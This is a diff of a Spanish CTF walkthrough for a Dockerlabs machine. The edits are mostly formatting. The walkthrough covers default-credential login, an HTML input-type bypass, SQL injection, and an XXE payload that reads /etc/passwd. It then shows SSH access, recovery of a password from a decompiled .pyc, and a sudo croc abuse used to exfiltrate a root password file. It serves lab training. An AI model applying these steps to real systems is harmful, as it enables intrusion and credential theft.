@@ -2,10 +2,10 @@
 icon: linux
 ---
 
-**Plataforma:** Dockerlabs
+**Plataforma:** Dockerlabs\
 **Sistema Operativo:** Linux
 
-> **Tags:** `Linux` `Web` `File Upload` `RCE` `Bypass` `Brute Force` `Sudoers`
+> **Tags:** `Linux` `Web` `SQLi` `XXE` `Bypass` `Python` `Sudoers` `Croc`
 
 ## INSTALACIÓN
 
@@ -87,17 +87,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
 ```
 
-Navegamos al servicio web del puerto 80 y encontramos un panel de login.
+Navegamos al servicio web del puerto `80` y encontramos un panel de `login`.
 
-![alt text](../../images/profetanet.png)
+![](../../images/profetanet.png)
 
-Probamos las credenciales admin:admin y logramos acceder.
+Probamos las credenciales `admin:admin` y logramos acceder.
 
 Al entrar nos encontramos un dashboard de monitorización de servidores.
 
 ![alt text](../../images/profetamoni.png)
 
-En la parte inferior de la página encontramos una cadena codificada en Base64.
+En la parte inferior de la página encontramos una cadena codificada en `Base64`.
 
 ```
 cmVjdWVyZGEuLi4gdHUgY29udHJhc2XxYSBlcyB0dSB1c3Vhcmlv
@@ -118,7 +118,7 @@ Esto nos da una gran pista que utilizaremos más adelante.
 
 # GOBUSTER
 
-A continuación, utilizamos Gobuster para enumerar directorios y archivos en el servidor web.
+A continuación, utilizamos `Gobuster` para enumerar directorios y archivos en el servidor web.
 
 ```Bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh,asp,aspx -b 403,404 -t 60
@@ -153,9 +153,9 @@ Starting gobuster in directory enumeration mode
 Progress: 236319 / 1985022 (11.91%)
 ```
 
-Revisamos los resultados: /uploads está vacío, upload.php devuelve un error 500 y test.txt no contiene información relevante.
+Revisamos los resultados: `/uploads` está vacío, `upload.php` devuelve un `error 500` y `test.txt` no contiene información relevante.
 
-Sin embargo, al acceder a /admin.php, encontramos otro panel de login.
+Sin embargo, al acceder a `/admin.php`, encontramos otro `panel de login`.
 
 ![alt text](../../images/notadmin.png)
 
@@ -167,17 +167,17 @@ Al intentar acceder con credenciales de prueba, obtenemos la siguiente pista:
 ⚠️ Pista: usaurio 'notadmin'
 ```
 
-Para evadir la restricción del formato de email, inspeccionamos el código fuente y cambiamos el atributo type="email" por type="username".
+Para evadir la restricción del formato de email, inspeccionamos el código fuente, localizamos la etiqueta `<input>` y modificamos el atributo `type="email"` por `type="text"`.
 
 ![alt text](../../images/bypassemail.png)
 
-Con el tipo de input modificado, probamos con las credenciales notadmin:notadmin, pero recibimos un mensaje de error:
+Con el tipo de input modificado, probamos con las credenciales `notadmin:notadmin`, pero recibimos un mensaje de error:
 
 ```
 ⚠️ Credenciales incorrectas
 ```
 
-El bypass del formulario ha funcionado, pero las credenciales no son válidas. Por lo tanto, intentamos una inyección SQL en el campo de la contraseña.
+El `bypass` del formulario ha funcionado, pero las credenciales no son válidas. Por lo tanto, intentamos una `inyección SQL` en el campo de la contraseña.
 
 ```
 notadmin
@@ -190,13 +190,13 @@ Esta vez logramos acceder con éxito.
 
 # XXE INJECTION
 
-Accedemos al "Portal 2".
+Accedemos al Portal 2.
 
 ![alt text](../../images/portalxxe.png)
 
-Nos encontramos con un procesador de XML, lo que sugiere que podría ser vulnerable a XXE (XML External Entity).
+Nos encontramos con un procesador de `XML`, lo que sugiere que podría ser vulnerable a `XXE` (XML External Entity).
 
-Probamos con el siguiente payload para intentar leer el archivo /etc/passwd.
+Probamos con el siguiente `payload` para intentar leer el archivo `/etc/passwd`.
 
 ```XML
 <?xml version="1.0" encoding="UTF-8"?>
@@ -245,19 +245,19 @@ sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
 )
 ```
 
-Identificamos dos usuarios en el sistema: jeremias y ezequiel.
+Identificamos dos usuarios en el sistema: `jeremias` y `ezequiel`.
 
-Recordando la pista obtenida anteriormente ("recuerda... tu contraseña es tu usuario"), probamos a conectarnos por SSH.
+Recordando la pista obtenida anteriormente ("recuerda... tu contraseña es tu usuario"), probamos a conectarnos por `SSH`.
 
 ```Bash
 ssh jeremias@172.17.0.2
 ```
 
-Las credenciales jeremias:jeremias resultan ser válidas y logramos acceso al sistema.
+Las credenciales `jeremias:jeremias` resultan ser válidas y logramos acceso al sistema.
 
 # MOVIMIENTO LATERAL
 
-Enumeramos el directorio personal en /home/jeremias y encontramos un archivo llamado ezequiel.pyc. 
+Enumeramos el directorio personal en `/home/jeremia`s y encontramos un archivo llamado `ezequiel.pyc`. 
 
 Para analizarlo correctamente, lo transferimos a nuestra máquina atacante.
 
@@ -272,15 +272,15 @@ En nuestra máquina atacante lo descargamos:
 wget http://172.17.0.2:4443/ezequiel.pyc .
 ```
 
-Utilizamos la herramienta online pylingual.io para descompilar el archivo .pyc y recuperar el código fuente original en Python.
+Utilizamos la herramienta online `pylingual.io` para descompilar el archivo `.pyc` y recuperar el código fuente original en `Python`.
 
 Una vez descompilado, analizamos el código y encontramos lo siguiente:
 
 ![alt text](../../images/pyc.png)
 
-Concatenamos las dos variables encontradas para formar una posible contraseña: 234r3fsd2-34fsdrr32.
+Concatenamos las dos variables encontradas para formar una posible contraseña: `234r3fsd2-34fsdrr32`.
 
-Probamos a pivotar al usuario ezequiel con esta contraseña.
+Probamos a pivotar al usuario `ezequiel` con esta contraseña.
 
 ```Bash
 su ezequiel
@@ -295,13 +295,13 @@ ezequiel@5d8e7a746121:~$
 
 # ESCALADA DE PRIVILEGIOS
 
-En /home/ezequiel encontramos un archivo llamado acces0.txt con el siguiente contenido:
+En `/home/ezequiel` encontramos un archivo llamado `acces0.txt` con el siguiente contenido:
 
 ```
 Hola hijo mio, te he dejado mi pwd dentro mi directorio /root/passw0rd_r00t.txt. Firmado: root
 ```
 
-Comprobamos los permisos sudo del usuario.
+Comprobamos los permisos `sudo` del usuario.
 
 ```Bash
 sudo -l
@@ -318,9 +318,9 @@ User ezequiel may run the following commands on 5d8e7a746121:
     (ALL) NOPASSWD: /usr/local/bin/croc
 ```
 
-Podemos ejecutar la herramienta croc como root sin contraseña. 
+Podemos ejecutar la herramienta `croc` como `root` sin contraseña. 
 
-Croc permite transferir archivos de forma segura, por lo que podemos usarla para exfiltrar el archivo /root/passw0rd_r00t.txt a nuestra máquina atacante.
+`Croc` permite transferir archivos de forma segura, por lo que podemos usarla para exfiltrar el archivo `/root/passw0rd_r00t.txt` a nuestra máquina atacante.
 
 En la máquina víctima ejecutamos:
 
@@ -365,7 +365,7 @@ Info:
 fl4sk1pwd
 ```
 
-Finalmente, utilizamos esta contraseña para autenticarnos como root.
+Finalmente, utilizamos esta contraseña para autenticarnos como `root`.
 
 ```Bash
 su root
